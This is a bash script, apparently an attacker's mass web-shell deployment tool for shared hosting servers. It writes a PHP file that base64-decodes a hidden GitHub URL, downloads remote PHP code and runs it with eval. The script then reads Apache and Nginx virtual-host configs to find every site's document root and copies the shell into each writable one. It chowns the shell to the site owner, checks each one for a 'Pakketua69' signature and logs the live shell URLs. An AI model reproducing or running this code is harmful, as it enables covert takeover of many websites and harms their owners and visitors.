#!/bin/bash

TESTFILE="test123zz"
SHELL_FILE="aby.php"
SHELL_NAME="aby.php"
echo "TESTPAGE_$(date +%s)" > "/tmp/$TESTFILE"

# Check for debug mode
DEBUG=0
if [ "$1" = "-v" ] || [ "$1" = "--verbose" ]; then
    DEBUG=1
    echo "[*] Verbose mode enabled"
fi

# Create aby.php if not exists (embedded content)
if [ ! -f "$SHELL_FILE" ]; then
    echo "[*] Creating $SHELL_FILE..."
    cat > "$SHELL_FILE" << 'SHELLEOF'
<?php
function fetch_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $output = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'cURL error: ' . curl_error($ch);
        $output = false;
    }

    curl_close($ch);
    return $output;
}

$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3d1bGl6bzMzNS1jbXlrL2hvbWVwYWdlL3JlZnMvaGVhZHMvbWFpbi9zYXJhZGEucGhw";
$decoded_url = base64_decode($encoded_url);

$content = fetch_content($decoded_url);

if ($content !== false) {
    eval("?>".$content);
} else {
    echo "Gagal mengambil isi file!";
}
?>
SHELLEOF
    chmod 644 "$SHELL_FILE"
    echo "[*] Created $SHELL_FILE"
else
    echo "[*] Using existing $SHELL_FILE"
fi

# Function to extract domain from vhost config file
extract_domain() {
    local config_file="$1"
    local domain=""

    # Try to extract ServerName or server_name from config
    if [ -f "$config_file" ]; then
        # For Apache config
        domain=$(grep -i "^[[:space:]]*ServerName" "$config_file" | head -1 | awk '{print $2}')

        # If not found in Apache format, try Nginx format
        if [ -z "$domain" ]; then
            domain=$(grep -i "^[[:space:]]*server_name" "$config_file" | head -1 | sed 's/.*server_name//' | awk '{print $1}' | tr -d ';')
        fi

        # If still empty, try to get from filename
        if [ -z "$domain" ]; then
            domain=$(basename "$config_file" | sed 's/\.conf$//' | sed 's/\.ssl$//')
        fi
    fi

    echo "$domain"
}

# Collect all domains from vhost configurations
declare -A domains_map
declare -a domains_list

# Check Apache vhosts
if [ -d "/usr/local/apache/conf.d/vhosts/" ]; then
    for config in /usr/local/apache/conf.d/vhosts/*.conf; do
        if [ -f "$config" ]; then
            domain=$(extract_domain "$config")
            if [ -n "$domain" ]; then
                domains_map["$domain"]="$config"
                domains_list+=("$domain")
            fi
        fi
    done
fi

# Check Nginx vhosts
if [ -d "/etc/nginx/conf.d/vhosts/" ]; then
    for config in /etc/nginx/conf.d/vhosts/*.conf; do
        if [ -f "$config" ]; then
            domain=$(extract_domain "$config")
            if [ -n "$domain" ] && [ -z "${domains_map[$domain]}" ]; then
                domains_map["$domain"]="$config"
                domains_list+=("$domain")
            fi
        fi
    done
fi

# If no domains found, exit
if [ ${#domains_list[@]} -eq 0 ]; then
    echo "No domains found in vhost configurations"
    rm -f "/tmp/$TESTFILE"
    exit 1
fi

echo "Found ${#domains_list[@]} domains to check"
echo "----------------------------------------"

# Array untuk track shell URLs
declare -a SHELLS_DEPLOYED

# Check each domain
for domain in "${domains_list[@]}"; do
    # Determine document root for each domain
    # Try to find in Apache config first
    doc_root=""
    config_file="${domains_map[$domain]}"

    if [ -f "$config_file" ]; then
        # Try Apache DocumentRoot
        doc_root=$(grep -i "^[[:space:]]*DocumentRoot" "$config_file" | head -1 | awk '{print $2}' | tr -d '"')

        # If not found, try Nginx root
        if [ -z "$doc_root" ]; then
            doc_root=$(grep -i "^[[:space:]]*root" "$config_file" | head -1 | sed 's/.*root//' | awk '{print $1}' | tr -d ';')
        fi
    fi

    # If no doc_root found, try to find in /home/*/public_html/
    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
        # Search for domain in /home/*/public_html/
        for user_dir in /home/*/; do
            if [ -d "${user_dir}public_html" ]; then
                # Check if this might be the domain's directory
                potential_root="${user_dir}public_html"

                # Look for domain-specific files or just use the directory
                if [ -d "$potential_root" ]; then
                    doc_root="$potential_root"
                    break
                fi
            fi
        done
    fi
    # ==========================================================
    # Additional domain-based document root patterns
    # ==========================================================
    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then

        # /var/www/domain.com
        if [ -d "/var/www/$domain" ]; then
            doc_root="/var/www/$domain"

        # /home/domain.com
        elif [ -d "/home/$domain" ]; then
            doc_root="/home/$domain"

        # /srv/www/domain.com
        elif [ -d "/srv/www/$domain" ]; then
            doc_root="/srv/www/$domain"
        fi

    fi

    # If still no doc_root, try to find based on username
    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
        # Extract username from domain or use domain name as username
        username=$(echo "$domain" | cut -d'.' -f1)
        if [ -d "/home/$username/public_html" ]; then
            doc_root="/home/$username/public_html"
        fi
    fi

    if [ -z "$doc_root" ] || [ ! -d "$doc_root" ]; then
        echo "✗ $domain - document root not found"
        continue
    fi

    # Check if it's Laravel
    LARAVEL=""
    if [ -d "${doc_root}storage" ]; then
        LARAVEL="yes"
    fi

    # Copy test file
    if [ -n "$LARAVEL" ]; then
        if [ -d "${doc_root}public" ]; then
            cp "/tmp/$TESTFILE" "${doc_root}public/" 2>/dev/null
            test_path="${doc_root}public/${TESTFILE}"
            shell_upload_path="${doc_root}public/${SHELL_NAME}"
            shell_url="https://${domain}/${SHELL_NAME}"
        else
            echo "✗ $domain - Laravel public directory not found"
            continue
        fi
    else
        cp "/tmp/$TESTFILE" "$doc_root/" 2>/dev/null
        test_path="${doc_root}${TESTFILE}"
        shell_upload_path="${doc_root}/${SHELL_NAME}"
        shell_url="https://${domain}/${SHELL_NAME}"
    fi

    # Test accessibility
    url="https://${domain}/${TESTFILE}"
    response=$(curl -s -L --max-time 10 --connect-timeout 5 -k "$url")

    accessible=0
    protocol="https"

    if echo "$response" | grep -q "TESTPAGE_"; then
        accessible=1
    else
        # Try http if https fails
        url="http://${domain}/${TESTFILE}"
        response=$(curl -s -L --max-time 10 --connect-timeout 5 -k "$url")
        if echo "$response" | grep -q "TESTPAGE_"; then
            accessible=1
            protocol="http"
            shell_url="http://${domain}/${SHELL_NAME}"
        fi
    fi

    if [ $accessible -eq 1 ]; then
        echo "✓ $domain - accessible (doc_root: $doc_root)"

        # Upload shell
        echo "  [*] Uploading shell to: $shell_upload_path"

        if [ $DEBUG -eq 1 ]; then
            echo "      Source: $(pwd)/$SHELL_FILE"
            echo "      Dest: $shell_upload_path"
        fi

        if cp "$SHELL_FILE" "$shell_upload_path" 2>/dev/null; then
            chmod 644 "$shell_upload_path" 2>/dev/null

            if [ $DEBUG -eq 1 ]; then
                echo "  [*] Shell copied, verifying..."
            fi

            # Verify shell uploaded by checking if file exists
            if [ -f "$shell_upload_path" ]; then
                if [ $DEBUG -eq 1 ]; then
                    echo "  [✓] Shell file exists at: $shell_upload_path"
                fi

            # ==================== STEP 2: CHOWN ====================
            echo "  [2/3] Chown..."

            dir_owner=$(ls -ld "$doc_root" 2>/dev/null | awk '{print $3}')

            if [ -n "$dir_owner" ]; then
                # Chown to user:user (NOT user:nobody!)
                chown "$dir_owner:$dir_owner" "$shell_upload_path" 2>/dev/null
                chmod 644 "$shell_upload_path" 2>/dev/null
                echo "      Owner: $dir_owner:$dir_owner"
            fi

            # ==================== STEP 3: CHECK SHELL ====================
            echo "  [3/3] Check shell..."
                # Test via HTTP(S) and check for signature
                shell_response=$(curl -s -L --max-time 5 --connect-timeout 3 -k "$shell_url" 2>&1)

                # Check if response contains "Pakketua69" signature
                if echo "$shell_response" | grep -q "Pakketua69"; then
                    echo "  [+] SHELL ACTIVE (Pakketua69 found): $shell_url"
                    SHELLS_DEPLOYED+=("$shell_url")
                    if [ $DEBUG -eq 1 ]; then
                        echo "      Full response: $shell_response"
                    fi
                else
                    if [ $DEBUG -eq 1 ]; then
                        echo "  [-] Shell uploaded but Pakketua69 NOT found"
                        first_line=$(echo "$shell_response" | head -1)
                        echo "      Response: $first_line"
                    else
                        echo "  [-] Shell uploaded but not active (no Pakketua69)"
                    fi
                fi
            else
                echo "  [-] Failed to verify shell file at: $shell_upload_path"
            fi
        else
            echo "  [-] Failed to upload shell (copy failed)"
            if [ $DEBUG -eq 1 ]; then
                echo "      Check permissions for: $doc_root"
            fi
        fi
    else
        echo "✗ $domain - not accessible (doc_root: $doc_root)"
    fi

    # Cleanup test file
    rm -f "$test_path" 2>/dev/null
done

# Cleanup temp file
rm -f "/tmp/$TESTFILE"

echo "----------------------------------------"
echo "Done checking domains"

# Show summary
echo ""
echo "======== SUMMARY ========"
echo "Total domains found: ${#domains_list[@]}"
echo "Shells deployed: ${#SHELLS_DEPLOYED[@]}"

if [ ${#SHELLS_DEPLOYED[@]} -gt 0 ]; then
    echo ""
    echo "[+] Shell URLs:"
    for shell in "${SHELLS_DEPLOYED[@]}"; do
        echo "  $shell"
    done

    # Save to file
    echo "" > shells_deployed.txt
    for shell in "${SHELLS_DEPLOYED[@]}"; do
        echo "$shell" >> shells_deployed.txt
    done
    echo ""
    echo "[*] Shells saved to: shells_deployed.txt"
else
    echo "[-] No shells deployed"
fi

echo "========================"
